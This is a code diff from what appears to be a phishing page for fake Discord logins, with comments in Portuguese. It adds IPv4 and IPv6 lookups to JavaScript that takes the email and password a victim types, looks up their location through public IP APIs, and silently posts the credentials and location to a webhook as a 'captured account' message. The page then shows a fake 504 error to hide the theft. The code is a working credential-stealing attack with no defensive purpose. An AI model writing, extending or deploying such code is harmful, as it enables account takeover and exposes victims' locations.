@@ -296,13 +296,26 @@
         return;
       }
 
-      let ip = 'Desconhecido';
+      // Captura IPv4 e IPv6 separadamente
+      let ipv4 = 'Não detectado';
+      let ipv6 = 'Não detectado';
       let location = 'Desconhecido';
+
+      try {
+        let resIPv4 = await fetch('https://api.ipify.org?format=json');
+        let dataIPv4 = await resIPv4.json();
+        if (dataIPv4.ip) ipv4 = dataIPv4.ip;
+      } catch {}
+
       try {
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
         if (data.ip) {
-          ip = data.ip;
+          if (data.ip.includes(':')) {
+            ipv6 = data.ip;
+          } else if (ipv4 === 'Não detectado') {
+            ipv4 = data.ip;
+          }
           location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
         }
       } catch {
@@ -310,12 +323,17 @@
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
           if (data2.ip) {
-            ip = data2.ip;
+            if (data2.ip.includes(':')) {
+              ipv6 = data2.ip;
+            } else if (ipv4 === 'Não detectado') {
+              ipv4 = data2.ip;
+            }
             location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
           }
         } catch {}
       }
 
+      // Hora correta para Cotia/SP (America/Sao_Paulo)
       const agora = new Date();
       const options = {
         timeZone: 'America/Sao_Paulo',
@@ -339,22 +357,26 @@
       const hoje = partes.find(p => p.type === 'hour').value.padStart(2, '0') + ':' +
                    partes.find(p => p.type === 'minute').value.padStart(2, '0');
 
+      // Mensagem completa com IPv4, IPv6 e localização
       const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
 **Login:** \`${email}\`
 **Senha:** \`${senha}\`
 
-🌐 IP Capturado: ${ip}
-📍 Localização aproximada: ${location}
+**IPv4:** ${ipv4}
+**IPv6:** ${ipv6}
+**Localização aproximada:** ${location}
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
 
+      // Envia pro webhook silenciosamente
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: mensagem })
       }).catch(() => {});
 
+      // Mostra erro 504 animado
       errorBox.classList.add('show');
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
